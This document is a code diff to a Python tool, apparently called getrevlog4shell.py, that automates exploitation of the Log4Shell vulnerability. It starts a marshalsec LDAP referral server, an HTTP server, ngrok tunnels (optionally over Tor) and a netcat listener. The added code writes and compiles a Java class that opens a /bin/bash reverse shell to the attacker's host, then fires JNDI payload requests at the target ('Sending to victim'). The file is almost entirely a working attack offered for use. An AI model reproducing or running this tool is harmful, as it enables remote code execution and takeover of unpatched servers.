@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import subprocess
 import os
 import shlex
@@ -38,7 +40,8 @@ class start_LDAP_Server():
     def run(self):
         os.chdir(self.path)
         if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
-            self.cmd = 'cd ' + self.path + '; ' + self.cmd
+            os.chdir(self.path)
+            self.cmd = self.cmd
             try:
                 self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
                 while True:
@@ -78,6 +81,7 @@ def execute(list_cmd, process):
         time.sleep(2)
         if not process.stop_control:
             list_code.append(code)
+            print("\nSending to victim:\n" + cmd)
             subprocess.run(shlex.split(cmd))
         else:
             msg = process.msg
@@ -85,8 +89,12 @@ def execute(list_cmd, process):
     
     result_code = msg.split("Send LDAP reference result for ")[1].split(' ')[0]
     if result_code in list_code:
-        print("\n\nFound command:\n\n" + list_cmd[list_code.index(result_code)][0])
-        end()
+        cmd = list_cmd[list_code.index(result_code)][0]
+        print("\n\nFound command:\n\n" + cmd)
+        cmd = cmd.replace('/' + result_code + '}', '/#' + name_file + '}')
+        print("\nSending:\n" + cmd)
+        subprocess.run(shlex.split(cmd))
+        #end()
     else:
         print('Command not found in list')
 
@@ -94,9 +102,9 @@ def ngrok_start():
     global use_tor
     os.chdir(os.getcwd() + '/ngrok_tunnel')
     if use_tor:
-        cmd = 'xterm -e ngrok start --all --config tunnel_tor.yml'
+        cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel_tor.yml'
     else:
-        cmd = 'xterm -e ngrok start --all --config tunnel.yml'
+        cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel.yml'
     return subprocess.run(shlex.split(cmd))
 
 def ngrok_get():
@@ -152,9 +160,9 @@ def ngrok_create(auth_token, port_http_server, port_ldap_server):
 def git_clone():
     git_url= 'https://github.com/mbechler/marshalsec.git'
     path = os.getcwd()
-    if not (os.path.isdir(path + path_ldap_service)):
-        os.makedirs(path + "/" + path_ldap_service.split('/')[1])
-        Repo.clone_from(git_url, path + path_ldap_service)
+    if not (os.path.isdir(path + path_ldap_server)):
+        os.makedirs(path + "/" + path_ldap_server.split('/')[1])
+        Repo.clone_from(git_url, path + path_ldap_server)
 
 def end():
     return os.system("kill -9 " + str(os.getpid()))
@@ -166,7 +174,7 @@ def verify_server(process):
     try:
         clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         clientsocket.connect((host_http, int(port_ldap_server)))
-        clientsocket.sendall(b"Hello")
+        clientsocket.sendall(b"Hi LDAP!")
         clientsocket.close()
         return True
     except Exception as e:
@@ -199,9 +207,19 @@ def to_process(commands):
         else:
             pass
         port = ":" + port_http_server
+
+        http_server = HTTP(port_http_server)
+        try:
+            p5 = executor.submit(http_server.run, )
+            p5.result(timeout=5)
+        except concurrent.futures.TimeoutError:
+            pass
+
+        p7 = executor.submit(netcat,)
+
         command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port + '/#' + name_file +'"'
-        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_service)
-        if (os.path.isfile(abs_path + path_ldap_service + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
+        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_server)
+        if (os.path.isfile(abs_path + path_ldap_server + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
             timeout = 1
         else:
             timeout = 20
@@ -214,7 +232,7 @@ def to_process(commands):
         progress = False
         try:
             p4 = executor.submit(verify_server, ldap_server)
-            progress = p4.result(timeout=10)
+            progress = p4.result(timeout=30)
         except concurrent.futures.TimeoutError:
             pass
 
@@ -224,7 +242,12 @@ def to_process(commands):
             print("LDAP server loading error. Restart aplication.")
             end()
 
-        p5 = executor.submit(execute, commands, ldap_server)
+        p6 = executor.submit(execute, commands, ldap_server)
+
+def netcat():
+    cmd = 'exo-open --launch TerminalEmulator nc -lnvp ' + port_nc_server + ' &'
+    subprocess.call([cmd], shell=True)
+    return
 
 def readfile(burp_file):
     global vuln_server, method, headers, data
@@ -302,11 +325,12 @@ def prepare_list_commands():
     return commands
 
 def initialize():
-    #global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, name_file, use_tor
     commands = []
     if burp_file:
         commands = readfile(burp_file)
+    os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
     git_clone()
+    create_class_java()
     if use_ngrok:
         ngrok_verify()
         if recreate:
@@ -324,13 +348,70 @@ def initialize():
 
     to_process(commands)
 
+class HTTP:
+    def __init__(self, port_http_server):
+        self.port = port_http_server
+
+    def __del__(self):
+        if hasattr(self, "proc"):
+            self.proc.terminate()
+            self.proc.kill()
+            self.proc.send_signal(subprocess.signal.SIGKILL)
+
+    def run(self):
+        self.proc = subprocess.call(['exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --bind ' + host_http + ' --directory ' + abs_path + path_http_server + ' &'], shell=True)
+
+def compile_java(java_file):
+    os.chdir(abs_path + path_http_server)
+    command = 'javac -verbose ' + java_file
+    cmd = command.split(" ")
+    os.spawnlp(os.P_WAIT, *cmd)
+    print("File " + java_file + " compiled")
+    os.chdir(abs_path)
+    return
+
+def create_class_java():
+    string_class_java = 'import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class ' + name_file + ' {  public ' + name_file + '() throws Exception {    String host="' + host_nc + '";    int port=' + port_nc_server + ';    String cmd="/bin/bash";    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();    Socket s=new Socket(host,port);    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();    OutputStream po=p.getOutputStream(),so=s.getOutputStream();    while(!s.isClosed()) {      while(pi.available()>0)        so.write(pi.read());      while(pe.available()>0)        so.write(pe.read());      while(si.available()>0)        po.write(si.read());      so.flush();      po.flush();      Thread.sleep(50);      try {        p.exitValue();        break;      }      catch (Exception e){      }    };    p.destroy();    s.close();  }}'
+    string = string_class_java.split(";")
+    if not (os.path.isdir(abs_path + path_http_server)):
+        os.makedirs(abs_path + path_http_server)
+    f = open(abs_path + path_http_server + '/' +  name_file + ".java", "w")
+    for i in string:
+        if '{' in i:
+            w = i.split("{")
+            for s in w:
+                if '}' in i:
+                    t = s.split("}")
+                    for h in t:
+                        if t.index(h) != len(t) - 1:
+                            if w.index(s) == len(w) - 1:
+                                f.write(h + '};\n')
+                            else:
+                                print(h)
+                                f.write(h + '}\n')
+                        else:
+                            if w.index(s) != len(w) - 1:
+                                f.write(h + '{\n')
+                else:
+                    if w.index(s) != len(w) - 1:
+                        f.write(s + '{\n')
+                    else:
+                        f.write(s + ';\n')
+        else:
+            if not i == '':
+                f.write (i + ';\n')
+
+    f.close()
+    compile_java(name_file + ".java")
+
 if __name__ == "__main__":
     name_file = 'log4jRCE'
     hostname = socket.gethostname()
     host_http = socket.gethostbyname(hostname)
     host_tcp = host_http
     host_nc = host_tcp
-    path_ldap_service = "/LDAP_Service/marshalsec"
+    path_ldap_server = "/LDAP_Service/marshalsec"
+    path_http_server = "/HTTP_Service"
     abs_path = os.getcwd()
     parser = argparse.ArgumentParser(
         description='Usage getrevlog4shell.py -v "http://vulnerable.host" [options]',
